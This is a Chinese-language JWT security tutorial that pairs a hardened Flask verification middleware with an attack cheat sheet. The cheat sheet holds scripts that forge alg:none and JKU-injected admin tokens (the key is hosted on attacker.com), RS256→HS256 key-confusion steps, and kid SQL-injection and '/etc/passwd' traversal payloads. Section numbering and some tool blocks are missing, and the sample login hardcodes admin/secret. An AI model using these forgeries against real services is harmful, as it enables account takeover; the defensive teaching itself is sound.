# 代码实战示例

### 10.1 完整的JWT安全验证中间件

```python
"""
JWT安全验证中间件 - 包含所有安全检查
"""

import jwt
import time
import hmac
import hashlib
from functools import wraps
from flask import request, jsonify, g

class JWTSecurityMiddleware:
    """JWT安全验证中间件"""

    def __init__(self, public_key, private_key=None):
        self.public_key = public_key  # RS256公钥
        self.private_key = private_key  # RS256私钥（签发用）
        self.allowed_algorithms = ['RS256']  # 算法白名单
        self.required_claims = ['sub', 'iat', 'exp', 'iss', 'aud']
        self.trusted_issuers = {'https://auth.example.com'}
        self.trusted_audiences = {'api.example.com'}
        self.revoked_jtis = set()  # 已撤销的JWT ID

    def sign_token(self, payload, expiry_seconds=3600):
        """签发JWT"""
        now = int(time.time())
        import secrets

        full_payload = {
            **payload,
            'iss': 'https://auth.example.com',
            'aud': 'api.example.com',
            'iat': now,
            'nbf': now,
            'exp': now + expiry_seconds,
            'jti': secrets.token_urlsafe(16)  # 唯一ID
        }

        token = jwt.encode(
            full_payload,
            self.private_key,
            algorithm='RS256',
            headers={'typ': 'JWT', 'kid': 'key-001'}
        )

        return token

    def verify_token(self, token):
        """验证JWT - 安全检查"""
        try:
            # 1. 解码Header（不验证签名先看）
            unverified_header = jwt.get_unverified_header(token)

            # 2. 检查算法白名单
            alg = unverified_header.get('alg')
            if alg not in self.allowed_algorithms:
                return {'valid': False, 'reason': f'不允许的算法: {alg}'}

            if alg == 'none' or alg is None:
                return {'valid': False, 'reason': '无签名JWT被拒绝'}

            # 3. 验证签名和声明
            payload = jwt.decode(
                token,
                self.public_key,
                algorithms=self.allowed_algorithms,
                options={
                    'verify_signature': True,
                    'verify_exp': True,
                    'verify_iat': True,
                    'verify_nbf': True,
                    'verify_aud': True,
                    'verify_iss': True,
                    'require': self.required_claims
                },
                issuer=list(self.trusted_issuers),
                audience=list(self.trusted_audiences)
            )

            # 4. 检查JTI是否已撤销
            jti = payload.get('jti')
            if jti and jti in self.revoked_jtis:
                return {'valid': False, 'reason': '令牌已被撤销'}

            return {'valid': True, 'payload': payload}

        except jwt.ExpiredSignatureError:
            return {'valid': False, 'reason': '令牌已过期'}
        except jwt.InvalidAudienceError:
            return {'valid': False, 'reason': '无效的受众'}
        except jwt.InvalidIssuerError:
            return {'valid': False, 'reason': '无效的签发者'}
        except jwt.InvalidAlgorithmError:
            return {'valid': False, 'reason': '无效的算法'}
        except jwt.InvalidTokenError as e:
            return {'valid': False, 'reason': f'无效令牌: {str(e)}'}
        except Exception as e:
            return {'valid': False, 'reason': f'验证异常: {str(e)}'}

    def revoke_token(self, jti):
        """撤销JWT"""
        self.revoked_jtis.add(jti)

    def require_auth(self, f):
        """认证装饰器"""
        @wraps(f)
        def decorated(*args, **kwargs):
            auth_header = request.headers.get('Authorization', '')

            if not auth_header.startswith('Bearer '):
                return jsonify({'error': '缺少认证令牌'}), 401

            token = auth_header[7:]
            result = self.verify_token(token)

            if not result['valid']:
                return jsonify({
                    'error': '认证失败',
                    'reason': result['reason']
                }), 401

            # 注入用户信息
            g.current_user = result['payload']

            return f(*args, **kwargs)

        return decorated

    def require_permission(self, permission):
        """权限装饰器"""
        def decorator(f):
            @wraps(f)
            def decorated(*args, **kwargs):
                user = getattr(g, 'current_user', None)
                if not user:
                    return jsonify({'error': '未认证'}), 401

                permissions = user.get('permissions', [])
                if permission not in permissions:
                    return jsonify({
                        'error': '权限不足',
                        'required': permission
                    }), 403

                return f(*args, **kwargs)
            return decorated
        return decorator


# 使用示例
app = Flask(__name__)

# 生成RSA密钥对
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

private_key_obj = rsa.generate_private_key(public_exponent=65537, key_size=2048)
private_pem = private_key_obj.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
public_pem = private_key_obj.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

jwt_middleware = JWTSecurityMiddleware(public_pem, private_pem)

@app.route('/api/v1/login', methods=['POST'])
def login():
    """登录获取JWT"""
    data = request.json
    if data.get('username') == 'admin' and data.get('password') == 'secret':
        token = jwt_middleware.sign_token({
            'sub': 'user_001',
            'name': 'Admin',
            'role': 'admin',
            'permissions': ['read:users', 'write:users', 'delete:users']
        })
        return jsonify({'access_token': token, 'token_type': 'Bearer'})
    return jsonify({'error': '认证失败'}), 401

@app.route('/api/v1/users')
@jwt_middleware.require_auth
@jwt_middleware.require_permission('read:users')
def list_users():
    """获取用户列表（需要read:users权限）"""
    return jsonify({
        'users': [
            {'id': 1, 'name': 'Alice'},
            {'id': 2, 'name': 'Bob'}
        ],
        'requested_by': g.current_user.get('name')
    })

@app.route('/api/v1/users/<int:user_id>', methods=['DELETE'])
@jwt_middleware.require_auth
@jwt_middleware.require_permission('delete:users')
def delete_user(user_id):
    """删除用户（需要delete:users权限）"""
    return jsonify({'success': True, 'deleted': user_id})
```

### 二、JWT 攻击命令速查

> ⚠️ **重要声明**：以下攻击技术仅用于授权的安全测试和防御研究。未经授权对任何系统进行攻击是违法行为。

#### 2.1 算法混淆攻击（None Algorithm）

**攻击原理：** 将JWT的alg字段改为"none"，某些库会跳过签名验证。

**使用jwt_tool：**
```bash
# 方法1：使用jwt_tool的alg:none攻击
python3 jwt_tool.py <JWT_token> -X n

# 方法2：alg设为None，签名部分留空
python3 jwt_tool.py <JWT_token> -T -S none
# 交互模式下修改Payload后生成
```

**手动构造（Python）：**
```python
import base64
import json

def base64url_encode(data):
    """Base64URL编码"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def create_none_alg_jwt(payload_dict):
    """构造alg:none的JWT"""
    header = {"alg": "none", "typ": "JWT"}
    
    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload_dict).encode())
    
    # 签名部分为空
    jwt_token = f"{header_b64}.{payload_b64}."
    return jwt_token

# 使用示例
payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

none_jwt = create_none_alg_jwt(payload)
print(f"None算法JWT: {none_jwt}")

# 变体：alg为None（大写N）
header_variants = ["none", "None", "NONE", "nOnE"]
```

**测试方法：**
```
1. 抓取正常请求中的JWT
2. 将alg改为none，移除签名
3. 修改Payload（如提升权限）
4. 发送请求，观察是否成功绕过认证
5. 尝试不同大小写变体：none, None, NONE
```

#### 2.2 RSA密钥混淆攻击（RS256 → HS256）

**攻击原理：** 将算法从RS256改为HS256，用公钥作为HMAC密钥，后端如果仍用公钥验证就会通过。

**获取公钥的方法：**
```
1. JWKS端点
   GET /.well-known/jwks.json
   GET /oauth/jwks
   GET /openid/jwks

2. 公开的公钥文件
   GET /public.pem
   GET /cert.pem
   GET /.well-known/openid-configuration

3. 从JWT的jku字段获取
   解码JWT Header，查看jku字段指向的URL

4. 从TLS证书提取
   openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout
```

**使用jwt_tool：**
```bash

# 2. 用公钥执行密钥混淆攻击

# 3. 选择要修改的Payload字段（如role改为admin）
# 工具会自动将alg改为HS256并用公钥签名
```

#### 2.4 JK/JKU 注入攻击

**攻击原理：** 利用JWT Header中的jku或jwk字段，让后端从攻击者控制的URL加载公钥。

**JKU注入（jku参数）：**
```python
import json
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# 1. 生成RSA密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)

# 2. 将公钥转换为JWK格式
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

def int_to_base64url(n):
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode()

jwk = {
    "kty": "RSA",
    "use": "sig",
    "alg": "RS256",
    "n": int_to_base64url(public_numbers.n),
    "e": int_to_base64url(public_numbers.e),
    "kid": "attacker-key"
}

jwks = {"keys": [jwk]}

# 3. 将JWKS上传到攻击者控制的服务器
# 例如：https://attacker.com/jwks.json

# 4. 构造恶意JWT（注入jku）
def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/jwks.json",
    "kid": "attacker-key"
}

payload = {
    "sub": "admin",
    "role": "admin",
    "exp": 9999999999
}

header_b64 = base64url_encode(json.dumps(header).encode())
payload_b64 = base64url_encode(json.dumps(payload).encode())
signing_input = f"{header_b64}.{payload_b64}".encode()

# 5. 用自己的私钥签名
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

signature = private_key.sign(
    signing_input,
    padding.PKCS1v15(),
    hashes.SHA256()
)

signature_b64 = base64url_encode(signature)
jwt_token = f"{header_b64}.{payload_b64}.{signature_b64}"

print(f"JKU注入JWT: {jwt_token}")
```

**使用jwt_tool：**

#### 2.5 kid 参数注入攻击

**攻击原理：** kid（Key ID）参数指定验证用的密钥，如果kid可控，可能导致SQL注入或任意文件读取。

**kid SQL注入：**
```
攻击场景：后端通过kid从数据库查询密钥

示例Payload：
"kid": "key1' UNION SELECT 'attacker_key'--"

攻击效果：
- 如果后端直接拼接SQL查询密钥
- 攻击者可以控制用于验证的密钥
- 用自己的密钥签名的JWT就能通过验证
```

**kid 路径遍历：**
```
攻击场景：后端通过kid从文件系统加载密钥文件

示例Payload：
"kid": "../../../etc/passwd%00"
"kid": "../../dev/null"

攻击效果：
- 读取任意文件作为密钥
- 如果能控制文件内容，可能绕过验证
- 结合其他漏洞（如文件上传）
```

### 三、JWT 安全加固最佳实践

#### 3.1 后端验证检查清单

```python
"""JWT安全验证检查清单"""

# ✅ 1. 算法白名单（禁止alg:none，指定允许的算法）
# jwt.decode(token, key, algorithms=["RS256"])
# 不要使用 algorithms=["HS256", "RS256"] 混合

# ✅ 2. 验证签名
# 确保 verify_signature=True（默认）

# ✅ 3. 验证过期时间
# verify_exp=True（默认）

# ✅ 4. 验证签发者
# issuer="https://auth.example.com"

# ✅ 5. 验证受众
# audience="api.example.com"

# ✅ 6. 验证nbf（Not Before）
# verify_nbf=True

# ✅ 7. 验证iat（Issued At）
# 可选：限制Token最大有效期

# ✅ 8. 验证JTI（JWT ID）
# 用于Token撤销/黑名单

# ✅ 9. 使用非对称算法（RS256/ES256）
# 密钥分离：私钥签名，公钥验证

# ✅ 10. 密钥管理
# - 密钥定期轮换
# - 密钥强度足够
# - 密钥安全存储

# ❌ 常见错误：
# - 不验证签名
# - 信任alg字段（算法混淆）
# - 使用弱密钥（HS256场景）
# - JWT存储在localStorage（XSS风险）
# - 无过期时间或过期时间过长
# - 无Token撤销机制
# - 敏感信息放在Payload中（Base64编码≠加密）
```

#### 3.2 安全配置示例（Flask + PyJWT）

```python
from flask import Flask, request, jsonify, g
import jwt
import time
import secrets
from functools import wraps

app = Flask(__name__)

# 安全配置
JWT_CONFIG = {
    'algorithm': 'RS256',           # 使用非对称算法
    'issuer': 'https://auth.example.com',
    'audience': 'api.example.com',
    'access_token_expiry': 900,     # 15分钟
    'refresh_token_expiry': 604800, # 7天
    'allowed_algorithms': ['RS256'],  # 算法白名单
}

# 加载公钥（验证用）
with open('keys/public_key.pem', 'rb') as f:
    PUBLIC_KEY = f.read()

# 加载私钥（签发用，仅认证服务需要）
with open('keys/private_key.pem', 'rb') as f:
    PRIVATE_KEY = f.read()

# Token黑名单（生产环境用Redis）
token_blacklist = set()

def generate_access_token(user_id, role):
    """生成访问令牌"""
    now = int(time.time())
    payload = {
        'sub': user_id,
        'role': role,
        'iss': JWT_CONFIG['issuer'],
        'aud': JWT_CONFIG['audience'],
        'iat': now,
        'nbf': now,
        'exp': now + JWT_CONFIG['access_token_expiry'],
        'jti': secrets.token_urlsafe(32),  # 唯一Token ID
        'type': 'access'
    }
    token = jwt.encode(payload, PRIVATE_KEY, algorithm=JWT_CONFIG['algorithm'])
    return token

def verify_token(token):
    """安全验证JWT"""
    try:
        # 严格验证：算法白名单 + 所有声明
        payload = jwt.decode(
            token,
            PUBLIC_KEY,
            algorithms=JWT_CONFIG['allowed_algorithms'],
            issuer=JWT_CONFIG['issuer'],
            audience=JWT_CONFIG['audience'],
            options={
                'verify_signature': True,
                'verify_exp': True,
                'verify_iat': True,
                'verify_nbf': True,
                'verify_aud': True,
                'verify_iss': True,
                'require': ['sub', 'iat', 'exp', 'iss', 'aud', 'jti']
            }
        )
        
        # 检查是否在黑名单中
        jti = payload.get('jti')
        if jti in token_blacklist:
            return None, '令牌已被撤销'
        
        # 检查Token类型
        if payload.get('type') != 'access':
            return None, '无效的令牌类型'
        
        return payload, None
        
    except jwt.ExpiredSignatureError:
        return None, '令牌已过期'
    except jwt.InvalidAudienceError:
        return None, '无效的受众'
    except jwt.InvalidIssuerError:
        return None, '无效的签发者'
    except jwt.InvalidAlgorithmError:
        return None, '无效的算法'
    except jwt.MissingRequiredClaimError as e:
        return None, f'缺少必要声明: {e}'
    except jwt.InvalidTokenError as e:
        return None, f'无效令牌: {str(e)}'

def require_auth(f):
    """认证装饰器"""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization', '')
        
        if not auth_header.startswith('Bearer '):
            return jsonify({'error': '缺少认证令牌'}), 401
        
        token = auth_header[7:]
        payload, error = verify_token(token)
        
        if error:
            return jsonify({'error': '认证失败', 'reason': error}), 401
        
        g.user = payload
        return f(*args, **kwargs)
    return decorated

# 路由示例
@app.route('/api/admin/users')
@require_auth
def admin_users():
    # 额外的权限检查
    if g.user.get('role') != 'admin':
        return jsonify({'error': '权限不足'}), 403
    return jsonify({'users': [...]})

@app.route('/api/logout', methods=['POST'])
@require_auth
def logout():
    """令牌撤销"""
    jti = g.user.get('jti')
    if jti:
        token_blacklist.add(jti)
    return jsonify({'message': '登出成功'})
```
